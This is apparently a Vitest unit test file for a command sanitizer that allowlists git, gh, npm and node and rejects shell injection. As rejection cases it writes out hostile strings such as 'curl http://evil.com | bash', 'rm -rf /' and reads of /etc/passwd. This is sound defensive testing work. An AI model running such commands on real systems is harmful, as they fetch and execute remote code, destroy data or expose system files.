import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import {
  CommandSanitizer,
  getCommandSanitizer,
  resetCommandSanitizer,
  CommandInjectionError,
  CommandNotAllowedError,
} from '../../src/security/index.js';

describe('CommandSanitizer', () => {
  let sanitizer: CommandSanitizer;

  beforeEach(() => {
    resetCommandSanitizer();
    sanitizer = new CommandSanitizer();
  });

  afterEach(() => {
    resetCommandSanitizer();
  });

  describe('validateCommand', () => {
    it('should validate git command with allowed subcommand', () => {
      const result = sanitizer.validateCommand('git', ['status', '--porcelain']);
      expect(result.baseCommand).toBe('git');
      expect(result.subCommand).toBe('status');
      expect(result.args).toEqual(['status', '--porcelain']);
    });

    it('should validate gh command', () => {
      const result = sanitizer.validateCommand('gh', ['pr', 'view', '123']);
      expect(result.baseCommand).toBe('gh');
      expect(result.subCommand).toBe('pr');
      expect(result.args).toEqual(['pr', 'view', '123']);
    });

    it('should validate npm command', () => {
      const result = sanitizer.validateCommand('npm', ['test']);
      expect(result.baseCommand).toBe('npm');
      expect(result.args).toEqual(['test']);
    });

    it('should throw CommandNotAllowedError for unknown command', () => {
      expect(() => sanitizer.validateCommand('curl', ['http://example.com'])).toThrow(
        CommandNotAllowedError
      );
    });

    it('should throw CommandNotAllowedError for disallowed git subcommand', () => {
      expect(() => sanitizer.validateCommand('git', ['rm', '-rf', '/'])).toThrow(
        CommandNotAllowedError
      );
    });
  });

  describe('sanitizeArgument', () => {
    it('should pass through safe arguments', () => {
      const result = sanitizer.sanitizeArgument('feature/my-branch');
      expect(result).toBe('feature/my-branch');
    });

    it('should throw CommandInjectionError for null bytes', () => {
      expect(() => sanitizer.sanitizeArgument('arg\0payload')).toThrow(CommandInjectionError);
    });

    it('should throw CommandInjectionError for newlines', () => {
      expect(() => sanitizer.sanitizeArgument('arg\necho bad')).toThrow(CommandInjectionError);
    });

    it('should throw CommandInjectionError for shell metacharacters in strict mode', () => {
      expect(() => sanitizer.sanitizeArgument('arg; rm -rf /')).toThrow(CommandInjectionError);
    });

    it('should throw for pipe character', () => {
      expect(() => sanitizer.sanitizeArgument('arg | cat /etc/passwd')).toThrow(
        CommandInjectionError
      );
    });

    it('should throw for command substitution', () => {
      expect(() => sanitizer.sanitizeArgument('$(whoami)')).toThrow(CommandInjectionError);
    });

    it('should throw for backtick command substitution', () => {
      expect(() => sanitizer.sanitizeArgument('`whoami`')).toThrow(CommandInjectionError);
    });
  });

  describe('parseCommandString', () => {
    it('should parse simple command', () => {
      const result = sanitizer.parseCommandString('git status');
      expect(result.command).toBe('git');
      expect(result.args).toEqual(['status']);
    });

    it('should parse command with multiple arguments', () => {
      const result = sanitizer.parseCommandString('git commit -m "message"');
      expect(result.command).toBe('git');
      expect(result.args).toEqual(['commit', '-m', 'message']);
    });

    it('should handle single-quoted arguments', () => {
      const result = sanitizer.parseCommandString("git commit -m 'message with spaces'");
      expect(result.args).toContain('message with spaces');
    });

    it('should remove shell redirections', () => {
      const result = sanitizer.parseCommandString('npm audit --json 2>/dev/null');
      expect(result.command).toBe('npm');
      expect(result.args).toEqual(['audit', '--json']);
    });

    it('should remove 2>&1 redirection', () => {
      const result = sanitizer.parseCommandString('gh auth status 2>&1');
      expect(result.args).not.toContain('2>&1');
    });
  });

  describe('escapeForShell', () => {
    it('should wrap argument in single quotes', () => {
      const result = sanitizer.escapeForShell('simple');
      expect(result).toBe("'simple'");
    });

    it('should escape internal single quotes', () => {
      const result = sanitizer.escapeForShell("it's");
      expect(result).toBe("'it'\\''s'");
    });
  });

  describe('isAllowed', () => {
    it('should return true for allowed commands', () => {
      expect(sanitizer.isAllowed('git')).toBe(true);
      expect(sanitizer.isAllowed('gh')).toBe(true);
      expect(sanitizer.isAllowed('npm')).toBe(true);
      expect(sanitizer.isAllowed('node')).toBe(true);
    });

    it('should return false for disallowed commands', () => {
      expect(sanitizer.isAllowed('curl')).toBe(false);
      expect(sanitizer.isAllowed('wget')).toBe(false);
      expect(sanitizer.isAllowed('bash')).toBe(false);
      expect(sanitizer.isAllowed('sh')).toBe(false);
    });
  });

  describe('validateConfigCommand', () => {
    it('should validate safe npm commands', () => {
      const result = sanitizer.validateConfigCommand('npm run test');
      expect(result.valid).toBe(true);
    });

    it('should reject command substitution', () => {
      const result = sanitizer.validateConfigCommand('npm run $(cat /etc/passwd)');
      expect(result.valid).toBe(false);
    });

    it('should reject backtick substitution', () => {
      const result = sanitizer.validateConfigCommand('npm run `whoami`');
      expect(result.valid).toBe(false);
    });

    it('should reject curl pipe bash patterns', () => {
      const result = sanitizer.validateConfigCommand('curl http://evil.com | bash');
      expect(result.valid).toBe(false);
    });

    it('should reject semicolon rm patterns', () => {
      const result = sanitizer.validateConfigCommand('npm test; rm -rf /');
      expect(result.valid).toBe(false);
    });
  });

  describe('getCommandSanitizer singleton', () => {
    it('should return singleton instance', () => {
      const instance1 = getCommandSanitizer();
      const instance2 = getCommandSanitizer();
      expect(instance1).toBe(instance2);
    });

    it('should reset singleton on resetCommandSanitizer', () => {
      const instance1 = getCommandSanitizer();
      resetCommandSanitizer();
      const instance2 = getCommandSanitizer();
      expect(instance1).not.toBe(instance2);
    });
  });
});
